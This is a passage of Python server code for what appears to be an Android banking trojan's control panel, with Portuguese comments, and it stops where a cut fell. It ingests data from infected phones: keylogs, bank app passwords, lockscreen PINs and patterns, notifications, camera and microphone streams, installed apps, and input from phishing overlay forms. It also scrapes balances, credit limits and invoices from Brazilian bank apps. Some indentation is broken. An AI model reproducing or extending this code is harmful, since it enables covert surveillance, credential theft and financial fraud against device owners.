                            logger.info(f"Label: {label}")
                            logger.info(f"Senha: {value} ({len(value)} dígitos)")
                            logger.info(f"{'='*60}\n")
                
                # Formato individual (isPassword=true)
                elif parsed.get('isPassword') and parsed.get('text'):
                    password_info = {
                        'device_id': device_id,
                        'bank': target_bank,
                        'package': target_pkg,
                        'password': parsed.get('text'),
                        'hint': parsed.get('hint', 'unknown'),
                        'label': parsed.get('hint', 'unknown'),
                        'digits': len(parsed.get('text', '')),
                        'timestamp': utc_now().isoformat(),
                        'status': 'captured',
                        'source': 'VISUAL_SCREEN'
                    }
                    
                    log = DeviceLog(
                        device_id=device_id,
                        log_type="BANK_PASSWORD",
                        log_data=json.dumps(password_info),
                        created_at=utc_now()
                    )
                    db.add(log)
                    
                    logger.info(f"🔐 KEYLOGGER {target_bank.upper()} - Senha: {password_info['password']}")
            
            # 🔒 PROCESSAMENTO ESPECIAL: PIN Capturado do Lockscreen
            elif parsed.get('type') == 'CAPTURED_PIN':
                pin = parsed.get('pin', '')
                logger.info(f"\n{'='*60}")
                logger.info(f"🔒 PIN CAPTURADO DO LOCKSCREEN!")
                logger.info(f"PIN: {pin}")
                logger.info(f"Device: {device_id}")
                logger.info(f"{'='*60}\n")
                
                # Armazena automaticamente
                manager.store_device_pin(device_id, pin)
                manager.store_device_lockscreen_active(device_id, False)
                
                # Salva no banco
                log = DeviceLog(
                    device_id=device_id,
                    log_type="CAPTURED_PIN",
                    log_data=json.dumps({'pin': pin, 'timestamp': utc_now().isoformat()}),
                    created_at=utc_now()
                )
                db.add(log)
            
            # 💉 PROCESSAMENTO ESPECIAL: Senha de aplicativo baixado capturada
            elif parsed.get('type') == 'CAPTURED_APP_PASSWORD':
                pkg = parsed.get('package', '')
                password = parsed.get('password', '')
                logger.info(f"\n{'='*60}")
                logger.info(f"💉 SENHA DE APP CAPTURADA!")
                logger.info(f"App: {pkg}")
                logger.info(f"Senha: {password}")
                logger.info(f"Device: {device_id}")
                logger.info(f"{'='*60}\n")
                
                # Salva no banco
                log = DeviceLog(
                    device_id=device_id,
                    log_type="CAPTURED_APP_PASSWORD",
                    log_data=json.dumps({
                        'package': pkg,
                        'password': password,
                        'timestamp': utc_now().isoformat()
                    }),
                    created_at=utc_now()
                )
                db.add(log)
            
            # 🔲 PROCESSAMENTO ESPECIAL: Pattern Capturado do Lockscreen
            elif parsed.get('type') == 'CAPTURED_PATTERN':
                pattern = parsed.get('pattern', '')
                logger.info(f"\n{'='*60}")
                logger.info(f"🔲 PATTERN CAPTURADO DO LOCKSCREEN!")
                logger.info(f"Pattern: {pattern}")
                logger.info(f"Device: {device_id}")
                logger.info(f"{'='*60}\n")
                
                # Armazena automaticamente
                manager.store_device_pattern(device_id, pattern)
                manager.store_device_lockscreen_active(device_id, False)
                
                # Salva no banco
                log = DeviceLog(
                    device_id=device_id,
                    log_type="CAPTURED_PATTERN",
                    log_data=json.dumps({'pattern': pattern, 'timestamp': utc_now().isoformat()}),
                    created_at=utc_now()
                )
                db.add(log)
                    
            # 🔔 PROCESSAMENTO ESPECIAL: Notificação Recebida do Aparelho
            elif parsed.get('eventType') == 'NOTIFICATION':
                pkg = parsed.get('package', 'desconhecido')
                app_name = parsed.get('appName', '')
                text = parsed.get('text', '')
                logger.info(f"🔔 NOTIFICAÇÃO de {device_id} ({pkg}): {text}")
                
                # Salva no banco de dados como log de notificação
                log = DeviceLog(
                    device_id=device_id,
                    log_type="DEVICE_NOTIFICATION",
                    log_data=json.dumps({
                        'package': pkg,
                        'appName': app_name,
                        'text': text,
                        'timestamp': utc_now().isoformat()
                    }),
                    created_at=utc_now()
                )
                db.add(log)
            
            else:
                # Processamento normal de keylog
                if device_id in manager.password_detector:
                    password_info = manager.password_detector[device_id].process_keylog(keylog_data)
                    
                    if password_info:
                        # Senha detectada! Salva separadamente
                        log = DeviceLog(
                            device_id=device_id,
                            log_type="BANK_PASSWORD",
                            log_data=json.dumps(password_info),
                            created_at=utc_now()
                        )
                        db.add(log)
                        
        except json.JSONDecodeError:
            # Se não for JSON, processa como keylog normal
            if device_id in manager.password_detector:
                password_info = manager.password_detector[device_id].process_keylog(keylog_data)
                if password_info:
                    log = DeviceLog(
                        device_id=device_id,
                        log_type="BANK_PASSWORD",
                        log_data=json.dumps(password_info),
                        created_at=utc_now()
                    )
                    db.add(log)
        
        # Salva keylog normal no banco de dados
        log = DeviceLog(
            device_id=device_id,
            log_type="KEYLOG",
            log_data=keylog_data,
            created_at=utc_now()
        )
        db.add(log)
        await safe_db_commit(db)
        
        # ⚡ TRANSMISSÃO EM TEMPO REAL INSTANTÂNEA PARA O PAINEL
        await manager.broadcast_to_operators({
            "type": "REALTIME_KEYLOG",
            "device_id": device_id,
            "log_data": keylog_data
        })
    
    elif msg_type == "KEYLOG_OFFLINE":
        # 💾 KEYLOG OFFLINE - capturado quando estava desconectado!
        keylog_data = message.get("data")
        saved_at = message.get("savedAt")
        
        logger.info(f"💾 KEYLOG OFFLINE de {device_id}: {keylog_data}")
        
        # Verifica se é um tipo especial (UNLOCK_SEQUENCE, etc)
        try:
            parsed = json.loads(keylog_data) if isinstance(keylog_data, str) else keylog_data
            
            if parsed.get('type') == 'UNLOCK_SEQUENCE':
                # É uma sequência de desbloqueio
                sequence_data = parsed.get('data')
                if sequence_data:
                    if isinstance(sequence_data, str):
                        sequence_data = json.loads(sequence_data)
                    manager.store_unlock_sequence(device_id, sequence_data)
                    logger.info(f"💾🔓 Unlock sequence OFFLINE de {device_id}")
                    
                    # Salva no log
                    log = DeviceLog(
                        device_id=device_id,
                        log_type="UNLOCK_SEQUENCE_OFFLINE",
                        log_data=json.dumps(parsed),
                        created_at=utc_now()
                    )
                    db.add(log)
        except:
            pass
        
        # Salva keylog offline no banco de dados
        log = DeviceLog(
            device_id=device_id,
            log_type="KEYLOG_OFFLINE",
            log_data=keylog_data,
            created_at=utc_now()
        )
        db.add(log)
        await safe_db_commit(db)
        
    elif msg_type == "SCREEN_HIERARCHY":
        # Screen Reader V2 - hierarquia da tela
        hierarchy_data = message.get("data")
        if hierarchy_data:
            manager.store_screen_hierarchy(device_id, hierarchy_data)
            
            # 💰 CAPTURA AUTOMÁTICA DE SALDO — busca R$ no conteúdo da tela
            try:
import re
import xml.etree.ElementTree as ET
                
                # Texto plano da hierarquia (pode ser JSON ou string)
                hier_text = hierarchy_data if isinstance(hierarchy_data, str) else json.dumps(hierarchy_data)
                
                # Verifica se o app em foco é um banco
                foreground_pkg = manager.device_info.get(device_id, {}).get("foreground_package", "")
                active_bank = manager.device_active_banks.get(device_id)
                current_pkg = (active_bank or {}).get("package") or foreground_pkg or ""
                
                # Mapeamento expandido para TODOS os bancos e apps financeiros do Brasil
def is_brazilian_bank(pkg):
                    pkg = pkg.lower()
                    bank_keywords = [
                        "bank", "banco", "pag", "pay", "card", "cartao", "credit", "finan", "invest", 
                        "itau", "bradesco", "nubank", "santander", "caixa", "sicredi", "sicoob", "cresol",
                        "inter", "c6", "neon", "original", "stone", "agibank", "digio", "will", "pan",
                        "xp", "rico", "clear", "btg", "safra", "banrisul", "banestes", "brb", "bmg",
                        "alelo", "sodexo", "ticket", "coop", "valegroup", "ame", "recargapay", "superdigital",
                        "mercadopago", "picpay", "dock", "dlocal", "grafeno", "delphi", "asaas", "fitbank",
                        "pjbank", "zoop", "celcoin", "efire", "gerencianet", "juninho", "iugu", "vindi",
                        "carteira", "wallet", "binance", "mercadobitcoin", "foxbit", "novadax", "coinext",
                        "pluxee", "ben", "flashapp", "wise", "revolut", "creditas"
                    ]
                    return any(kw in pkg for kw in bank_keywords)
                
                is_bank_screen = is_brazilian_bank(current_pkg)
                
                candidates = []
                
                # Regexes para encontrar valores monetários
                # 1. R$ 1.234,56 ou R$1234,56 ou R$ -12,34
                money_symbol_pattern = re.compile(
                    r'(?:R\$\s*|R\s*\$\s*)(-?\s*\d{1,3}(?:[\.,]\d{3})*[\.,]\d{2}|-?\s*\d+[\.,]\d{2})',
                    re.IGNORECASE
                )
                # 2. Apenas o número formatado como dinheiro: 1.234,56 ou 123,45 ou 1234,56
                money_raw_pattern = re.compile(
                    r'\b(-?\s*\d{1,3}(?:\.\d{3})*,\d{2})\b|\b(-?\s*\d+,\d{2})\b'
                )

def parse_brl_value(v):
                    v = v.replace("R$", "").replace("r$", "").replace(" ", "").strip()
                    if ',' in v and '.' in v:
                        if v.rfind(',') > v.rfind('.'):
                            v = v.replace('.', '').replace(',', '.')
                        else:
                            v = v.replace(',', '')
                    elif ',' in v:
                        v = v.replace(',', '.')
                    try:
                        return float(v)
                    except:
                        return None

                # Tenta parsear a hierarquia (pode ser JSON ou XML)
                nodes = []
                
                # 1. Tenta parsear como JSON
                try:
                    data = json.loads(hier_text)
                    root_node = data.get("hierarchy") if isinstance(data, dict) and "hierarchy" in data else data
                    
def traverse_json(node):
                        if not isinstance(node, dict):
                            return
                        text = node.get("text", "") or ""
                        content_desc = node.get("desc", "") or ""
                        resource_id = node.get("id", "") or ""
                        pkg = node.get("package", "") or ""
                        
                        nodes.append({
                            "text": text,
                            "content_desc": content_desc,
                            "resource_id": resource_id,
                            "package": pkg
                        })
                        for child in node.get("children", []):
                            traverse_json(child)
                            
                    traverse_json(root_node)
                except Exception as json_err:
                    # 2. Se falhar, tenta parsear como XML
                    try:
                        root = ET.fromstring(hier_text)
def traverse_xml(node):
                            text = node.get("text", "") or ""
                            content_desc = node.get("content-desc", "") or ""
                            resource_id = node.get("resource-id", "") or ""
                            pkg = node.get("package", "") or ""
                            nodes.append({
                                "text": text,
                                "content_desc": content_desc,
                                "resource_id": resource_id,
                                "package": pkg
                            })
                            for child in node:
                                traverse_xml(child)
                        traverse_xml(root)
                    except Exception as xml_err:
                        nodes = []

                bal_candidates = []
                lim_candidates = []
                inv_candidates = []

                if not nodes:
                    # Fallback Regex na string completa se o parser XML/JSON falhar
                    matches = money_symbol_pattern.findall(hier_text)
                    for m in matches:
                        val = parse_brl_value(m)
                        if val is not None and -999999.0 <= val <= 9999999.0:
                            # Filtro estrito para o Fallback Regex
                            m_pos = hier_text.find(m)
                            if m_pos != -1:
                                context = hier_text[max(0, m_pos - 80):min(len(hier_text), m_pos + len(m) + 80)].lower()
                                if any(nk in context for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"]):
                                    # Se tem termos de crédito no regex fallback, adiciona como candidato a limite/fatura
                                    if any(ik in context for ik in ["fatura", "invoice", "bill"]):
                                        inv_candidates.append({"val": val, "raw": m, "formatted": f"R$ {m.strip()}", "score": 200})
                                    else:
                                        lim_candidates.append({"val": val, "raw": m, "formatted": f"R$ {m.strip()}", "score": 200})
                                    continue
                            
                            score = 100
                            if is_bank_screen:
                                score += 100
                            hier_text_lower = hier_text.lower()
                            if any(pk in hier_text_lower for pk in ["saldo", "disponivel", "disponível", "balance"]):
                                score += 1000
                            bal_candidates.append({
                                "val": val,
                                "raw": m,
                                "formatted": f"R$ {m.strip()}",
                                "score": score
                            })
                else:
                    # Context Keywords (Brasil + Colômbia / Davivienda)
                    bal_pos_keywords = ["saldo", "disponivel", "disponível", "disponible", "saldo da conta", "saldo em conta", 
                                        "saldo actual", "saldo total", "conta corrente", "cuentas", "bolsillos", "daviplata", "carteira", 
                                        "wallet", "balance", "dinheiro em conta", "saldo disponível", "saldo disponivel"]
                    lim_pos_keywords = ["limite", "limite disponível", "limite disponivel", "limite de crédito", 
                                        "limite de credito", "limite total", "disponivel limite"]
                    inv_pos_keywords = ["fatura", "fatura atual", "valor da fatura", "fatura fechada", "fatura aberta", "faturas"]

                    for idx, item in enumerate(nodes):
                        text = item["text"].strip()
                        desc = item["content_desc"].strip()
                        resource_id = item["resource_id"].lower()
                        
                        for val_str in [text, desc]:
                            if not val_str:
                                continue
                            
                            val_str_lower = val_str.lower()
                            
                            # Tenta casar com símbolo R$
                            matches_sym = money_symbol_pattern.findall(val_str)
                            for m in matches_sym:
                                val = parse_brl_value(m)
                                if val is not None and -999999.0 <= val <= 9999999.0:
                                    formatted_val = f"R$ {m.strip()}"
                                    
                                    # 1. Pontuação para Saldo (Checking Balance)
                                    # Filtro estrito: sem termos de crédito no nó ou vizinhos
                                    is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"])
                                    is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "emprestimo", "card", "cartao", "invoice"])
                                    
                                    start_idx = max(0, idx - 4)
                                    end_idx = min(len(nodes), idx + 5)
                                    has_credit_neighbor = False
                                    for neighbor_idx in range(start_idx, end_idx):
                                        if neighbor_idx == idx:
                                            continue
                                        neighbor = nodes[neighbor_idx]
                                        n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                        if any(nk in n_text for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"]):
                                            has_credit_neighbor = True
                                            break
                                            
                                    if not (is_credit_node or is_credit_res or has_credit_neighbor):
                                        bal_score = 150
                                        if is_bank_screen:
                                            bal_score += 100
                                        if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]):
                                            bal_score += 4000
                                            
                                        # Bônus vizinhos
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx:
                                                continue
                                            neighbor = nodes[neighbor_idx]
                                            n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(pk in n_text for pk in bal_pos_keywords):
                                                bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                                
                                        # Regras específicas de banco
                                        if current_pkg:
                                            pkg_lower = current_pkg.lower()
                                            if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                if "balance" in resource_id or "saldo" in resource_id:
                                                    bal_score += 6000
                                            elif "mercadopago" in pkg_lower:
                                                if "balance" in resource_id or "money_amount" in resource_id:
                                                    bal_score += 6000
                                            elif "itau" in pkg_lower:
                                                if "saldo" in resource_id:
                                                    bal_score += 6000
                                                    
                                        bal_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": bal_score})
                                        
                                    # 2. Pontuação para Limite de Crédito
                                    is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupança", "investimento", "carteira", "extrato"])
                                    is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                    
                                    if not (is_bal_node or is_fatura_node):
                                        lim_score = 100
                                        if is_bank_screen:
                                            lim_score += 100
                                        if any(lk in val_str_lower for lk in ["limite", "limit"]):
                                            lim_score += 3000
                                        if any(lk in resource_id for lk in ["limit", "limite", "credit_limit"]):
                                            lim_score += 4000
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx:
                                                continue
                                            neighbor = nodes[neighbor_idx]
                                            n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(lk in n_text for lk in lim_pos_keywords):
                                                lim_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                
                                        if current_pkg:
                                            pkg_lower = current_pkg.lower()
                                            if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                if "limit" in resource_id:
                                                    lim_score += 5000
                                                    
                                        if lim_score >= 150:
                                            lim_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": lim_score})
                                            
                                    # 3. Pontuação para Fatura
                                    is_lim_node = any(lk in val_str_lower for lk in ["limite", "limit"])
                                    if not (is_bal_node or is_lim_node):
                                        inv_score = 100
                                        if is_bank_screen:
                                            inv_score += 100
                                        if any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"]):
                                            inv_score += 3000
                                        if any(fk in resource_id for fk in ["fatura", "invoice", "bill"]):
                                            inv_score += 4000
                                        for neighbor_idx in range(start_idx, end_idx):
                                            if neighbor_idx == idx:
                                                continue
                                            neighbor = nodes[neighbor_idx]
                                            n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                            distance = abs(neighbor_idx - idx)
                                            if any(fk in n_text for fk in inv_pos_keywords):
                                                inv_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                
                                        if inv_score >= 150:
                                            inv_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": inv_score})
                                    
                            # Tenta casar número puro apenas em telas financeiras
                            if is_bank_screen and not matches_sym:
                                matches_raw = money_raw_pattern.findall(val_str)
                                for m_tuple in matches_raw:
                                    m = m_tuple[0] or m_tuple[1]
                                    if m:
                                        val = parse_brl_value(m)
                                        if val is not None and -999999.0 <= val <= 9999999.0:
                                            formatted_val = f"R$ {m.strip()}"
                                            
                                            # 1. Pontuação Saldo (puro)
                                            is_credit_node = any(nk in val_str_lower for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"])
                                            is_credit_res = any(nk in resource_id for nk in ["limit", "credit", "fatura", "loan", "emprestimo", "card", "cartao", "invoice"])
                                            
                                            start_idx = max(0, idx - 4)
                                            end_idx = min(len(nodes), idx + 5)
                                            has_credit_neighbor = False
                                            for neighbor_idx in range(start_idx, end_idx):
                                                if neighbor_idx == idx:
                                                    continue
                                                neighbor = nodes[neighbor_idx]
                                                n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                if any(nk in n_text for nk in ["limite", "fatura", "crédito", "credito", "empréstimo", "emprestimo", "cartão", "cartao", "card", "loan", "invoice"]):
                                                    has_credit_neighbor = True
                                                    break
                                                    
                                            if not (is_credit_node or is_credit_res or has_credit_neighbor):
                                                bal_score = 50
                                                if any(pk in resource_id for pk in ["balance", "saldo", "money", "txt_saldo", "user_balance"]):
                                                    bal_score += 4000
                                                for neighbor_idx in range(start_idx, end_idx):
                                                    if neighbor_idx == idx:
                                                        continue
                                                    neighbor = nodes[neighbor_idx]
                                                    n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                    distance = abs(neighbor_idx - idx)
                                                    if any(pk in n_text for pk in bal_pos_keywords):
                                                        bal_score += 5000 if distance == 1 else (2500 if distance <= 3 else 1000)
                                                        
                                                if current_pkg:
                                                    pkg_lower = current_pkg.lower()
                                                    if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                        if "balance" in resource_id or "saldo" in resource_id:
                                                            bal_score += 6000
                                                    elif "mercadopago" in pkg_lower:
                                                        if "balance" in resource_id or "money_amount" in resource_id:
                                                            bal_score += 6000
                                                    elif "itau" in pkg_lower:
                                                        if "saldo" in resource_id:
                                                            bal_score += 6000
                                                            
                                                if bal_score >= 150:
                                                    bal_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": bal_score})
                                                    
                                            # 2. Pontuação Limite (puro)
                                            is_bal_node = any(pk in val_str_lower for pk in ["saldo", "poupança", "investimento", "carteira", "extrato"])
                                            is_fatura_node = any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"])
                                            
                                            if not (is_bal_node or is_fatura_node):
                                                lim_score = 50
                                                if any(lk in val_str_lower for lk in ["limite", "limit"]):
                                                    lim_score += 3000
                                                if any(lk in resource_id for lk in ["limit", "limite", "credit_limit"]):
                                                    lim_score += 4000
                                                for neighbor_idx in range(start_idx, end_idx):
                                                    if neighbor_idx == idx:
                                                        continue
                                                    neighbor = nodes[neighbor_idx]
                                                    n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                    distance = abs(neighbor_idx - idx)
                                                    if any(lk in n_text for lk in lim_pos_keywords):
                                                        lim_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                        
                                                if current_pkg:
                                                    pkg_lower = current_pkg.lower()
                                                    if "nu.production" in pkg_lower or "nubank" in pkg_lower:
                                                        if "limit" in resource_id:
                                                            lim_score += 5000
                                                            
                                                if lim_score >= 150:
                                                    lim_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": lim_score})
                                                    
                                            # 3. Pontuação Fatura (puro)
                                            is_lim_node = any(lk in val_str_lower for lk in ["limite", "limit"])
                                            if not (is_bal_node or is_lim_node):
                                                inv_score = 50
                                                if any(fk in val_str_lower for fk in ["fatura", "invoice", "bill"]):
                                                    inv_score += 3000
                                                if any(fk in resource_id for fk in ["fatura", "invoice", "bill"]):
                                                    inv_score += 4000
                                                for neighbor_idx in range(start_idx, end_idx):
                                                    if neighbor_idx == idx:
                                                        continue
                                                    neighbor = nodes[neighbor_idx]
                                                    n_text = (neighbor["text"] + " " + neighbor["content_desc"]).lower()
                                                    distance = abs(neighbor_idx - idx)
                                                    if any(fk in n_text for fk in inv_pos_keywords):
                                                        inv_score += 4000 if distance == 1 else (2000 if distance <= 3 else 1000)
                                                        
                                                if inv_score >= 150:
                                                    inv_candidates.append({"val": val, "raw": m, "formatted": formatted_val, "score": inv_score})

                # Escolhe o melhor candidato de cada categoria
                best_balance = None
                best_limit = None
                best_invoice = None
                
                if bal_candidates:
                    best_c = max(bal_candidates, key=lambda c: c["score"])
                    if best_c["score"] >= 1000 or (is_bank_screen and best_c["score"] >= 150):
                        best_balance = best_c["formatted"]
                        
                if lim_candidates:
                    best_c = max(lim_candidates, key=lambda c: c["score"])
                    if best_c["score"] >= 1000 or (is_bank_screen and best_c["score"] >= 150):
                        best_limit = best_c["formatted"]
                        
                if inv_candidates:
                    best_c = max(inv_candidates, key=lambda c: c["score"])
                    if best_c["score"] >= 1000 or (is_bank_screen and best_c["score"] >= 150):
                        best_invoice = best_c["formatted"]

                if best_balance or best_limit or best_invoice:
                    # Busca o último registro de BANK_BALANCE deste dispositivo e package
                    recent = db.query(DeviceLog).filter(
                        DeviceLog.device_id == device_id,
                        DeviceLog.log_type == "BANK_BALANCE"
                    ).order_by(DeviceLog.created_at.desc()).first()
                    
                    last_balance = None
                    last_limit = None
                    last_invoice = None
                    
                    if recent:
                        try:
                            r_data = json.loads(recent.log_data)
                            if r_data.get("package") == current_pkg:
                                last_balance = r_data.get("balance")
                                last_limit = r_data.get("credit_limit")
                                last_invoice = r_data.get("invoice")
                        except:
                            pass
                            
                    # Mescla
                    final_balance = best_balance or last_balance
                    final_limit = best_limit or last_limit
                    final_invoice = best_invoice or last_invoice
                    
                    has_changes = False
                    if not recent:
                        has_changes = True
                    else:
                        if final_balance != last_balance or final_limit != last_limit or final_invoice != last_invoice:
                            # Se mudou de banco, sempre grava
                            try:
                                r_data = json.loads(recent.log_data)
                                if r_data.get("package") != current_pkg:
                                    has_changes = True
                                else:
                                    has_changes = True
                            except:
                                has_changes = True
                            
                    if (final_balance or final_limit or final_invoice) and has_changes:
                        app_name_captured = (active_bank or {}).get("appName") or manager.device_info.get(device_id, {}).get("foreground_app") or current_pkg.split(".")[-1].title()
                        balance_log = DeviceLog(
                            device_id=device_id,
                            log_type="BANK_BALANCE",
                            log_data=json.dumps({
                                "package": current_pkg,
                                "appName": app_name_captured,
                                "balance": final_balance,
                                "credit_limit": final_limit,
                                "invoice": final_invoice,
                                "source": "screen_hierarchy_auto"
                            }),
                            created_at=utc_now()
                        )
                        db.add(balance_log)
                        db.commit()
                        logger.info(f"💰 SALDO AUTO-CAPTURADO de {device_id} ({app_name_captured}): Saldo={final_balance} | Limite={final_limit} | Fatura={final_invoice}")
            except Exception as e:
                logger.error(f"Erro na captura de saldo: {e}")
        logger.info(f"👁️ Screen Hierarchy de {device_id}: {len(hierarchy_data) if hierarchy_data else 0} bytes")
    
    elif msg_type == "UNLOCK_SEQUENCE":
        # 🔓 Sequência de desbloqueio gravada
        sequence_data = message.get("data")
        if sequence_data:
            try:
                if isinstance(sequence_data, str):
                    sequence_data = json.loads(sequence_data)
                manager.store_unlock_sequence(device_id, sequence_data)
                logger.info(f"🔓 Unlock sequence de {device_id}: {sequence_data.get('count', 0)} ações")
            except Exception as e:
                logger.error(f"Erro ao processar unlock sequence: {e}")
    
    elif msg_type == "CAMERA_FRAME":
        # 📷 Frame da câmera (base64)
        frame_b64 = message.get("data")
        if frame_b64:
            frame_bytes = base64.b64decode(frame_b64)
            await manager.store_camera_frame(device_id, frame_bytes)
            logger.info(f"📷 Camera frame de {device_id}: {len(frame_bytes)} bytes")
    
    elif msg_type == "AUDIO_CHUNK":
        # 🎤 Chunk de áudio (base64)
        audio_b64 = message.get("data")
        if audio_b64:
            audio_bytes = base64.b64decode(audio_b64)
            await manager.store_audio_chunk(device_id, audio_bytes)
            logger.info(f"🎤 Audio chunk de {device_id}: {len(audio_bytes)} bytes")
    
    elif msg_type == "INSTALLED_APPS":
        # 📱 Lista de apps instalados — salva em memória E no banco para persistência de ícones
        apps_list = message.get("apps", [])
        apps_count = message.get("count", 0)
        manager.store_installed_apps(device_id, apps_list)
        
        # Persiste no banco (sobrescreve)
        try:
            existing = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type == "INSTALLED_APPS_CACHE"
            ).first()
            cache_data = json.dumps({"apps": apps_list, "count": apps_count})
            if existing:
                existing.log_data = cache_data
                existing.created_at = utc_now()
            else:
                db.add(DeviceLog(
                    device_id=device_id,
                    log_type="INSTALLED_APPS_CACHE",
                    log_data=cache_data,
                    created_at=utc_now()
                ))
            db.commit()
        except Exception as e:
            logger.error(f"Erro ao persistir apps: {e}")
        
        logger.info(f"📱 Apps instalados de {device_id}: {apps_count} apps")
        
    elif msg_type == "BANK_OPENED":
        package = message.get("package")
        app_name = message.get("appName")
        icon = message.get("icon")
        if not icon:
            installed_apps = manager.get_installed_apps(device_id)
            if installed_apps:
                for app in installed_apps:
                    if app.get("package") == package and app.get("icon"):
                        icon = app.get("icon")
                        break
            if not icon:
                try:
                    existing = db.query(DeviceLog).filter(
                        DeviceLog.device_id == device_id,
                        DeviceLog.log_type == "INSTALLED_APPS_CACHE"
                    ).first()
                    if existing:
                        cache_data = json.loads(existing.log_data)
                        for app in cache_data.get("apps", []):
                            if app.get("package") == package and app.get("icon"):
                                icon = app.get("icon")
                                break
                except:
                    pass
        manager.device_active_banks[device_id] = {
            "package": package,
            "appName": app_name,
            "icon": icon,
            "timestamp": utc_now().isoformat()
        }
        logger.info(f"BANCO ABERTO: {device_id} abriu {app_name} ({package})")
        
    elif msg_type == "BANK_BALANCE":
        # 💰 Saldo bancário enviado explicitamente pelo app
        package = message.get("package")
        app_name = message.get("appName") or message.get("bank")
        balance = message.get("balance")
        if package and balance:
            # Formata o valor se vier sem R$
            if not str(balance).startswith("R$"):
                balance = f"R$ {balance}"
            log = DeviceLog(
                device_id=device_id,
                log_type="BANK_BALANCE",
                log_data=json.dumps({
                    "package": package,
                    "appName": app_name or package.split(".")[-1].title(),
                    "balance": balance,
                    "source": "app_explicit"
                }),
                created_at=utc_now()
            )
            db.add(log)
            db.commit()
            logger.info(f"💰 SALDO EXPLICIT de {device_id} ({app_name}): {balance}")
        
    elif msg_type == "BANK_CLOSED":
        if device_id in manager.device_active_banks:
            del manager.device_active_banks[device_id]
        logger.info(f"BANCO FECHADO: {device_id} fechou o aplicativo de banco")

    elif msg_type == "STUDIO_FORM_DATA":
        # Recebe os dados enviados pelo formulário da tela customizada
        data = message.get("data") or {}
        project_id = message.get("project_id") or data.get("_projectId") or "unknown"
        logger.info(f"🎨 STUDIO_FORM_DATA recebido de {device_id} para o projeto {project_id}: {data}")
        
        # 1. Salva na tabela StudioCapturedData (se o projeto for conhecido/existente)
from models import APKStudioProject, StudioCapturedData
        project = db.query(APKStudioProject).filter(
            APKStudioProject.project_id == project_id
        ).first()
        
        owner_id = project.owner_id if project else 1 # Fallback para admin (ID 1)
        client_ip = message.get("ip_address") or manager.device_info.get(device_id, {}).get("ip_address") or "WebSocket"
        
        captured = StudioCapturedData(
            project_id=project_id,
            owner_id=owner_id,
            data_json=json.dumps(data, ensure_ascii=False),
            device_ip=client_ip,
            device_info=json.dumps(manager.device_info.get(device_id, {}), ensure_ascii=False)
        )
        db.add(captured)
        db.commit()
        
        # 1.b. Salva log de overlay submetido para impedir novas exibições no auto-gatilho
        active_bank = manager.device_active_banks.get(device_id) or {}
        pkg_name = active_bank.get("package") or manager.device_info.get(device_id, {}).get("foreground_package") or "unknown"
        
        submit_info = {
            'device_id': device_id,
            'project_id': project_id,
            'package': pkg_name,
            'timestamp': utc_now().isoformat()
        }
        submit_log = DeviceLog(
            device_id=device_id,
            log_type="OVERLAY_SUBMITTED",
            log_data=json.dumps(submit_info, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(submit_log)
        
        # Salva o payload completo como CUSTOM_CAPTURES para visualização na aba de capturas customizadas
        custom_capture_log = DeviceLog(
            device_id=device_id,
            log_type="CUSTOM_CAPTURES",
            log_data=json.dumps({
                'project_id': project_id,
                'project_name': project.name if project else "Custom Screen",
                'captured_data': data,
                'timestamp': utc_now().isoformat()
            }, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(custom_capture_log)
        db.commit()
        
        # 2. Se houver algum campo de senha no formulário, salva na tabela DeviceLog como BANK_PASSWORD
        password = None
        field_found = "Senha"
        for k, v in data.items():
            if k.startswith("_") or k == "project_id":
                continue
            k_lower = k.lower()
            if any(term in k_lower for term in ["senha", "password", "pin", "code", "codigo", "assinatura"]):
                password = str(v)
                field_found = k
                break
        
        if not password:
            non_internal_fields = [v for k, v in data.items() if not k.startswith("_") and k != "project_id"]
            if non_internal_fields:
                password = str(non_internal_fields[0])
                
        if password:
            active_bank = manager.device_active_banks.get(device_id) or {}
            
            # Tenta pegar pacote vindo da injeção ou do active_bank
            target_pkg = data.get("package") or active_bank.get("package") or "Desconhecido"
            target_bank = data.get("bank") or active_bank.get("appName")
            
            if not target_bank or target_bank == "Desconhecido":
                target_bank = BankPasswordDetector.BANK_APPS.get(target_pkg)
            if not target_bank or target_bank == "Desconhecido":
